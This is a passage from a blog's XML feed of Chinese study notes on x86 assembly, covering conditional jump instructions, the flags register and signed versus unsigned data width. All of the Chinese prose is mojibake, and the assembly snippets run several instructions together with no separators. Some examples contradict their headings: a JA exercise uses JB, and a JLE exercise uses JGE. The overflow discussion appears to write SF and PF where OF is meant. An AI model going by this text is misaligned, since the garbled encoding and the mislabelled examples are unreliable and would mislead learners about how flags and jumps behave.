CX,90CMP CX,AXJB 0X00401044</code></pre><h4 id="11ã€-JBE-JNA-å°äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1-or-ZF-1"><a href="#11ã€-JBE-JNA-å°äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1-or-ZF-1" class="headerlink" title="11ã€ JBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 or ZF=1"></a>11ã€ JBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 or ZF=1</h4><p>ä¸€ç§ç›´æ¥è·Ÿç»ƒä¹ 9ä¸€æ ·ç›´æ¥æ„é€ è®©CF=1æˆ–è€…è®©è·Ÿç»ƒä¹ 1è®©ZF=0å°±å¯ä»¥äº†ã€‚</p><pre><code>MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B</code></pre><p>æˆ–è€…</p><pre><code>MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E</code></pre><h4 id="12ã€-JNBE-JA-å¤§äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0-and-ZF-0"><a href="#12ã€-JNBE-JA-å¤§äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0-and-ZF-0" class="headerlink" title="12ã€ JNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°) CF=0 and ZF=0"></a>12ã€ JNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°) CF=0 and ZF=0</h4><pre><code>MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044</code></pre><p>è§£æï¼š</p><p>è¿™ä¸ªä¸ç»ƒä¹ 10çš„åŒºåˆ«å°±æ˜¯ä¸å¯ä»¥è®©ä¸¤ä¸ªæ•°ç›¸ç­‰ã€‚</p><h4 id="13ã€-JL-JNGE-å°äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SFâ‰ -OF"><a href="#13ã€-JL-JNGE-å°äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SFâ‰ -OF" class="headerlink" title="13ã€ JL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SFâ‰  OF"></a>13ã€ JL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SFâ‰  OF</h4><pre><code>MOV AL,0XFFMOV CL,0X01CMP AL,CLJB 0X00401063JL 0X00401063</code></pre><p>è§£æï¼šç»ˆäºåˆ°äº†è®©æˆ‘ååˆ†è¿·æƒ‘çš„æœ‰æ— ç¬¦å·JCCçš„è·³è½¬æŒ‡ä»¤ï¼Œè¿™é‡Œåšäº†å¯¹æ¯”JB JL,çœ‹æ ‡å¿—ä½è‚¯å®šèƒ½è§£å†³ä¸€åˆ‡ï¼ˆè¿™æ˜¯å¯¹è®¡ç®—æœºæ¥è¯´ï¼‰ï¼Œæˆ‘ä»¬æ²¡çœ‹æ ‡å¿—ä½æå‰åšåˆ¤æ–­çš„è¯€çªï¼š<strong>å°±æ˜¯å½“ä½ ç”¨æœ‰ç¬¦å·æ•°JCCæŒ‡ä»¤ï¼ˆJG,JL,JLE,JGEï¼ŒJNGï¼ŒJNL,JNGEï¼ŒJNLEï¼‰çš„æ—¶å€™ï¼Œä¸€å®šè¦æŠŠä¸¤ä¸ªæ“ä½œæ•°ç›´æ¥äººå·¥çœ‹åšæœ‰ç¬¦å·æ¥çœ‹ï¼</strong></p><p><strong>æ¯”å¦‚è¿™ä¸ªç»ƒä¹ ç”¨åˆ°äº†JL,FFå°±æ˜¯-1äº†ï¼Œé‚£ä¹ˆ<code>-1&lt;1</code>è¿™ä¸ªè‚¯å®šçš„ï¼Œæ‰€ä»¥JLè·³è½¬ã€‚ä½†æ˜¯å¯¹äºJBï¼ŒFFå°±æ˜¯FFè‚¯å®šå¤§äº1ï¼Œæ‰€ä»¥æ²¡æœ‰è·³è½¬ã€‚</strong></p><h4 id="14ã€-JNL-JGE-å¤§äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SF-OF"><a href="#14ã€-JNL-JGE-å¤§äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SF-OF" class="headerlink" title="14ã€ JNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SF=OF"></a>14ã€ JNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SF=OF</h4><pre><code>MOV AL,1MOV CL,0CCCMP AL,CLJGE 0X0040108B</code></pre><h4 id="15ã€-JLE-JNG-å°äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-1-or-SFâ‰ -OF"><a href="#15ã€-JLE-JNG-å°äºç­‰äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-1-or-SFâ‰ -OF" class="headerlink" title="15ã€ JLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) ZF=1 or SFâ‰  OF"></a>15ã€ JLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) ZF=1 or SFâ‰  OF</h4><pre><code>MOV AL,1MOV CL,0CCCMP CL,ALJGE 0X0040108B</code></pre><p>è¿™ä¸ªå°±æ˜¯å¯¹ç«‹15ç»ƒä¹ ï¼Œæƒ³åˆ©ç”¨ZFç­‰äº1è¿™ä¸ªè·³è½¬ï¼Œåœ¨cmpä¸­æ²¡ä»€ä¹ˆå¥½æ•´çš„ï¼Œ<strong>è¿™ä¸¤ä¸ªæ“ä½œæ•°åªèƒ½æ˜¯ç›¸åŒçš„æ•°ï¼Œæ²¡ä»€ä¹ˆçœ‹ä¸çœ‹åšæœ‰æ— ç¬¦å·çš„è¯´æ³•</strong>ã€‚</p><h4 id="16ã€-JNLE-JG-å¤§äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-0-and-SF-OF"><a href="#16ã€-JNLE-JG-å¤§äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-ZF-0-and-SF-OF" class="headerlink" title="16ã€ JNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°) ZF=0 and SF=OF"></a>16ã€ JNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°) ZF=0 and SF=OF</h4><pre><code>MOV AX,1MOV CX,FFCMP AX,CXJG  0x004010A6MOV AL,1MOV CL,0FFCMP AL,CLJG  0x004010A6</code></pre><p>è§£æï¼š</p><p>åˆ¤æ–­ä¸€ä¸‹ï¼Œç¬¬1æ®µä»£ç å¯¹è¿˜æ˜¯ç¬¬2æ®µä»£ç å¯¹ï¼Ÿ</p><p>åœ¨åŸæ¥çš„è§‚ç‚¹ï¼Œå¯¹æœ‰ç¬¦å·JCCè¦æŠŠä¸¤ä¸ªæ“ä½œæ•°çœ‹åšè½¬åŒ–åçš„æœ‰ç¬¦å·æ•°å¯¹å¾…ï¼Œ<strong>ä¸”ä¸€å®šè¦æ³¨æ„ä¸‹æ•°æ®å®½åº¦ã€‚</strong>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€æ®µä»£ç æ˜¯æ— æ³•å®ç°JGè·³è½¬çš„ï¼Œ<strong>å› ä¸ºå…¶æ•°æ®å®½åº¦çš„é—®é¢˜ï¼Œå½±å“åˆ°SF,æ‰€ä»¥å…¶æ²¡åŠæ³•<code>SF=OF</code>å°±æ²¡æ³•è·³è½¬ã€‚</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ‡å¿—å¯„å­˜å™¨</title>
    <link href="/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ‡å¿—å¯„å­˜å™¨"><a href="#æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="æ ‡å¿—å¯„å­˜å™¨"></a>æ ‡å¿—å¯„å­˜å™¨</h1><h2 id="éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»"><a href="#éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»" class="headerlink" title="éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»"></a>éƒ¨åˆ†æ ‡å¿—å¯„å­˜å™¨è¯¦ç»†ä»‹ç»</h2><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15704423980063.jpg" srcset="/img/loading.gif" alt><br>éœ€è¦å…ˆç†Ÿç»ƒè®°ä½è¿™å‡ ä¸ªå¯„å­˜å™¨çš„ä½ç½®å’Œåç§°ï¼š<code>CF PF AF ZF SF OF</code></p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>è¿›ä½æ ‡å¿—CF(Carry Flag):å¦‚æœè¿ç®—ç»“æœçš„<strong>æœ€é«˜ä½</strong>äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–å€Ÿä½ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p><p>è§£æï¼šåœ¨çœ‹è¿ç®—ç»“æœçš„æ—¶å€™ï¼Œå…ˆæå‰ç¡®å®šå¥½å‚ä¸è¿ç®—çš„æ•°æ˜¯<strong>æœ‰æ— ç¬¦å·æ•°</strong>å’Œ<strong>å®ƒä»¬çš„æ•°æ®å®½åº¦</strong>ã€‚å…¶ä¸PFçš„éš¾è¾¨éš¾åˆ†ï¼Œé‡ç‚¹æ˜¯çœ‹å‚ä¸è¿ç®—çš„æ•°æ˜¯å¦ä¸ºæ— ç¬¦å·æ•°ï¼Œè¿™ä¸ªæ˜¯ç¨‹åºå‘˜å†™ä»£ç çš„æ—¶å€™å®šä¹‰çš„ã€‚é»˜è®¤éƒ½æ˜¯æœ‰ç¬¦å·çš„ï¼Œè¿™å°±ä¸»è¦çœ‹åé¢çš„PFäº†ã€‚</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>å¥‡å¶æ ‡å¿—PF(Parity Flag)ï¼šPFæ ‡å¿—ä½ï¼Œæ ¹æ®ç»“æœä¸­<strong>æœ€ä½æœ‰æ•ˆå­—èŠ‚(æœ€ä½8ä½)</strong>ä¸­â€œ1â€çš„ä¸ªæ•°æ¥ç¡®å®šç½®1è¿˜æ˜¯æ¸…0ã€‚å¦‚æœâ€œ1â€çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œåˆ™PFçš„å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p><p>è§£æï¼šè¿™ä¸ªåœ¨å¾ˆå¤šæ•™æä¸­æ˜¯é”™çš„ï¼Œè¿™ä¸ªéœ€è¦å¼ºè°ƒæ ¹æ®çš„æ˜¯è¿ç®—ç»“æœçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æœ€ä½8ä½é‡Œé¢1çš„ä¸ªæ•°ã€‚</p><h3 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h3><p>è¾…åŠ©è¿›ä½æ ‡å¿—AF(Auxiliary Carry Flag)ï¼š<br>å¦‚æœåœ¨â€œåŠ â€æ“ä½œæœŸé—´ä»ä½åŠå­—èŠ‚ï¼ˆæœ€ä½å››ä½ï¼‰åˆ°é«˜åŠå­—èŠ‚ï¼ˆé«˜å››ä½ï¼‰æœ‰è¿›ä½ï¼Œæˆ–è€…åœ¨å‡æ³•æœŸé—´çš„ä½8ä½éƒ¨åˆ†ä»é«˜åŠå­—èŠ‚åˆ°ä½åŠå­—èŠ‚æœ‰å€Ÿä½ï¼Œåˆ™å°†è¾…åŠ©æ ‡å¿—è®¾ç½®ä¸ºï¼ˆ1ï¼‰ã€‚å¦åˆ™ï¼Œå¦‚æœä¸å‘ç”Ÿè¿™ç§è¿›ä½æˆ–å€Ÿä½ï¼Œåˆ™æ¸…é™¤æ ‡å¿—æˆ–å°†å…¶â€œå¤ä½â€ï¼ˆè®¾ç½®ä¸º0ï¼‰ã€‚<strong>â€”-ï¼ˆç»´åŸºç™¾ç§‘ï¼‰</strong></p><p>è¾…åŠ©è¿¸ä½æ ‡å¿—:ç®—æ•°æ“ä½œçµæœçš„ç¬¬ä¸‰ä½ã€ˆä»0å¹µå§‹è®¡æ•°ã€‰å¦‚æœå‘ç”Ÿäº†è¿¸ä½æˆ–è€…å€Ÿä½å‰‡å°‡å…¶ç½®ä¸º1,å¦å‰‡ä¸º0,å¸¸åœ¨BCD(binary-codedecimal)ç®—æœ¨è¿„ç®—ä¸­è¢«ä½¿ç”¨ã€‚<strong>â€”ï¼ˆç™¾åº¦ç™¾ç§‘ï¼‰</strong></p><p>è§£æï¼šè¿™ä¸ªè¿˜æ˜¯åœ¨å¾ˆå¤šèµ„æ–™ä¸Šæ˜¯é”™è¯¯çš„ï¼Œåœ¨x86æ±‡ç¼–ä¸Šæ­£ç¡®è§£é‡Šå¦‚ä¸Šï¼Œä¹Ÿå°±æ˜¯<strong>åœ¨D0-D7ä¸­ï¼ŒD3å‘D4ä½è¿›ä½æˆ–è€…å€Ÿä½ï¼Œæ‰ä¼šç½®1ã€‚</strong>ï¼ˆè¿™ä¸ªå½“åˆè€å¸ˆè®²é”™ã€ç™¾åº¦é«˜èµä¹Ÿæ˜¯é”™çš„ï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼‰ã€‚</p><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>é›¶æ ‡å¿—ZF(Zero Flag)ï¼šé›¶æ ‡å¿—ZFç”¨æ¥åæ˜ è¿ç®—ç»“æœæ˜¯å¦ä¸º0ã€‚å¦‚æœè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚åœ¨åˆ¤æ–­è¿ç®—ç»“æœæ˜¯å¦ä¸º0æ—¶ï¼Œå¯ä½¿ç”¨æ­¤æ ‡å¿—ä½ã€‚<br>è§£æï¼šå¼•ä¸€ä¸‹å¸¸ç”¨çš„<code>xor r8/16/32,r8/16/32</code>å¯¹å¯„å­˜å™¨æ¸…é›¶æ“ä½œã€‚</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>ç¬¦å·æ ‡å¿—SF(Sign Flag)ï¼šç¬¦å·æ ‡å¿—SFç”¨æ¥åæ˜ è¿ç®—ç»“æœçš„ç¬¦å·ä½ï¼Œå®ƒä¸è¿ç®—ç»“æœçš„æœ€é«˜ä½ç›¸åŒã€‚</p><p>è§£æï¼šè¿˜æ˜¯éœ€è¦ç¡®å®šæ•°æ®å®½åº¦ï¼Œçœ‹å¥½åˆ°åº•å“ªä¸ªæ˜¯æœ€é«˜ä½ï¼Œç„¶åæŠŠ<strong>å®ƒæ¢æˆ2è¿›åˆ¶</strong>ç¡®å®šæœ€é«˜ä½æ˜¯0è¿˜æ˜¯1.<br>ä¾‹å­ï¼š</p><pre><code>MOV AL,20MOV CX,8000ADD AX,CX</code></pre><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15704627287517.jpg" srcset="/img/loading.gif" alt="-w117"><br>è¿™ä¸ªå°±æ˜¯åœ¨å­—ä¸Šæ“ä½œï¼Œç„¶åç›¸åŠ ç»“æœæ˜¯<code>8020</code>,æœ€é«˜ä½å°±æ˜¯<code>1000</code>ï¼Œé‚£è¿™ä¸ªSFå°±æ˜¯1äº†ã€‚è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªsfæ ‡å¿—ä¹Ÿæ˜¯çœ‹æ•°æ®å®½åº¦çš„ã€‚</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>æº¢å‡ºæ ‡å¿—OF(Overflow Flag)ï¼šæº¢å‡ºæ ‡å¿—OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡ºã€‚å¦‚æœè¿ç®—ç»“æœè¶…è¿‡å½“å‰è¿ç®—ä½æ•°æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œåˆ™ç§°ä¸ºæº¢å‡ºï¼ŒOFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™ï¼ŒOFçš„å€¼è¢«æ¸…ä¸º0ã€‚</p><p>è§£æï¼šè¿™ä¸ªå¸¸ä¸CFæ··æ·†ï¼Œä»¥ä¸ºä»–ä»¬æ²¡å•¥åŒºåˆ«ï¼Œä½†æ˜¯è¿™ä¸ªæ‰æ˜¯æ­£å®—çš„è®¡ç®—æœºçœ‹æ˜¯å¦æº¢å‡ºçš„æ ‡å¿—ä½ã€‚</p><p>CFä¸SFåŒºåˆ«ï¼š</p><ul><li>è¿›ä½æ ‡å¿—è¡¨ç¤º<strong>æ— ç¬¦å·æ•°</strong>è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´.</li><li>æº¢å‡ºæ ‡å¿—è¡¨ç¤º<strong>æœ‰ç¬¦å·æ•°</strong>è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´.</li></ul><p>æº¢å‡ºä¸»è¦æ˜¯ç»™<strong>æœ‰ç¬¦å·è¿ç®—</strong>ä½¿ç”¨çš„ï¼Œåœ¨æœ‰ç¬¦å·çš„è¿ç®—ä¸­ï¼Œæœ‰å¦‚ä¸‹çš„è§„å¾‹ï¼š</p><ul><li>æ­£ + æ­£ = æ­£ å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º</li><li>è´Ÿ + è´Ÿ = è´Ÿ å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º</li><li>æ­£ + è´Ÿ æ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡º.<br><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15704444932243.jpg" srcset="/img/loading.gif" alt="-w315"><br>ç»“åˆè¿™ä¸ªå›¾åœ¨åº”ä¸ºå¯¹PFçš„åˆ¤æ–­ï¼Œéå¸¸å¥½ç”¨ã€‚<strong>åˆ¤æ–­çš„æ—¶å€™ï¼Œä¸€å®šæ³¨æ„PFæ˜¯åœ¨æœ‰ç¬¦å·æ•°åšè¿ç®—çš„æ—¶å€™å»çœ‹çš„ï¼Œæ— ç¬¦å·ç›´æ¥çœ‹CFå°±å¥½äº†ã€‚</strong></li></ul><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼</h3><pre><code>MOV AL,0FEADD AL,10</code></pre><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703705840520.jpg" srcset="/img/loading.gif" alt="-w669"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼</h3><pre><code>MOV AL,1ADD AL,2</code></pre><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703707829255.jpg" srcset="/img/loading.gif" alt="-w630"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼</h3><pre><code>MOV EAX,0FADD EAX,1</code></pre><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703770643896.jpg" srcset="/img/loading.gif" alt="-w588"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼</h3><pre><code>MOV CL,0F1ADD CL,1</code></pre><p><img src="/2019/10/06/æ ‡å¿—å¯„å­˜å™¨/images/15703773573324.jpg" srcset="/img/loading.gif" alt="-w716"></p><h3 id="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼"><a href="#å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼" class="headerlink" title="å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼"></a>å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼</h3><pre><code>MOV AL,80SUB AL,10 </code></pre><p>è¿™ä¸ªéœ€è¦é‡è§†ä¸‹ï¼Œç»ƒä¹ çš„æ—¶å€™æœ‰ç‚¹å—æ€ç»´é™åˆ¶äº†ã€‚æ²¡æœ‰æƒ³åˆ°ç”¨SUBæ¥æ„é€ å‡ºï¼Œ<strong>ç«™åœ¨80çš„ä½ç½®é¡ºæ—¶é’ˆæŸ¥10ï¼Œè´Ÿ-æ­£=æ­£</strong>ï¼Œæ¥å®ç°æº¢å‡ºå®Œæˆåªå½±å“OFä½ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—</title>
    <link href="/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/"/>
    <url>/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—"><a href="#æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—" class="headerlink" title="æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—"></a>æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—</h1><h2 id="æ•°æ®å®½åº¦"><a href="#æ•°æ®å®½åº¦" class="headerlink" title="æ•°æ®å®½åº¦"></a>æ•°æ®å®½åº¦</h2><p>æ•°å­¦ä¸Šçš„æ•°å­—ï¼Œæ˜¯æ²¡æœ‰å¤§å°é™åˆ¶çš„ï¼Œå¯ä»¥æ— é™çš„å¤§ã€‚ä½†åœ¨è®¡ç®—æœºä¸­ï¼Œç”±äºå—ç¡¬ä»¶çš„åˆ¶çº¦ï¼Œæ•°æ®éƒ½æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼ˆæˆ‘ä»¬ç§°ä¸ºæ•°æ®å®½åº¦ï¼‰ï¼Œè¶…è¿‡æœ€å¤šå®½åº¦çš„æ•°æ®ä¼šè¢«ä¸¢å¼ƒã€‚</p><h3 id="å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°"><a href="#å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°" class="headerlink" title="å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°"></a>å¯¹æ•°æ®å®½åº¦çš„ç†è§£å’Œæœ‰æ— ç¬¦å·æ•°</h3><h4 id="4ä½å®½åº¦è¡¨ç¤º"><a href="#4ä½å®½åº¦è¡¨ç¤º" class="headerlink" title="4ä½å®½åº¦è¡¨ç¤º"></a>4ä½å®½åº¦è¡¨ç¤º</h4><p>4ä½å®½åº¦è¡¨ç¤ºï¼šå‡è®¾è®¡ç®—æœºåªèƒ½å­˜å‚¨4ä½2è¿›åˆ¶æ•°ï¼š</p><table><thead><tr><th align="center">0000</th><th align="center">0001</th><th align="center">0010</th><th align="center">0011</th><th align="center">0100</th><th align="center">0101</th><th align="center">0110</th><th align="center">0111</th><th align="center">1000</th><th align="center">1001</th><th align="center">1010</th><th align="center">1011</th><th align="center">1100</th><th align="center">1101</th><th align="center">1110</th><th align="center">1111</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">A</td><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">E</td><td align="center">F</td></tr></tbody></table><p><img src="/2019/10/01/æ•°æ®å®½åº¦ä¸é€»è¾‘è¿ç®—/images/15699374653790.jpg" srcset="/img/loading.gif" alt="-w303"><br>å­˜æ— ç¬¦å·æ•°æ—¶ï¼š<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code><br>å­˜æœ‰ç¬¦å·æ•°æ—¶ï¼š<br>    æ­£æ•°ï¼š<code>0 1 2 3 4 5 6 7</code><br>    è´Ÿæ•°ï¼š<code>-1 -2 -3 -4 -5 -6 -7 -8</code><br>    å…¶ä¸­å¯¹åº”å…³ç³»ï¼š</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr></tbody></table><p>æ— ç¬¦å·æ•°æ—¶ï¼šä»0åˆ°Fé€†æ—¶é’ˆä¾æ¬¡å¢å¤§ã€‚</p><p>æœ‰ç¬¦å·æ•°æ—¶ï¼šå«ä¹‰ä»åœ†ä¸­é—´åŠˆå¼€ï¼Œæ­£æ•°è´Ÿæ•°å„ä¸€åŠï¼Œåœ¨Få¤„ä¸ºæœ€å¤§è´Ÿæ•°ï¼Œ0å¤„ä¸ºæœ€å°çš„æ­£æ•°ã€‚</p><h5 id="ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ"></a>ä¸ºä»€ä¹ˆåœ¨å­˜æœ‰ç¬¦å·æ•°æ—¶è¯´å¼€å¤´ä¸º1çš„æ•°å°±æ˜¯è´Ÿæ•°ï¼Ÿ</h5><p>æˆ‘ä»¬åªçœ‹äºŒè¿›åˆ¶ï¼š<br>| 0  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |<br>| â€” | â€” | â€” | â€” | â€” | â€” | â€” | â€” | â€”  |<br>| 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 |</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>1111</td><td>1110</td><td>1101</td><td>1100</td><td>1011</td><td>1010</td><td>1001</td><td>1000</td></tr><tr><td>å¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºï¼Œå½“äºŒè¿›åˆ¶å¼€å¤´ä¸º1çš„æ—¶å€™å¯¹åº”å­˜çš„æ•°å€¼å°±æ˜¯è´Ÿæ•°äº†ã€‚</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>ä¸¾ä¾‹ï¼šå¯¹1011çš„ç†è§£</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1011åœ¨æˆ‘ä»¬å½“åšæ˜¯æœ‰ç¬¦å·æ—¶å°±æ˜¯-5ï¼Œæ— ç¬¦å·å°±æ˜¯Bã€‚<strong>è¿™ä¸ªå®Œå…¨çœ‹æˆ‘ä»¬å¦‚ä½•å»å®šä¹‰ã€‚</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>#### 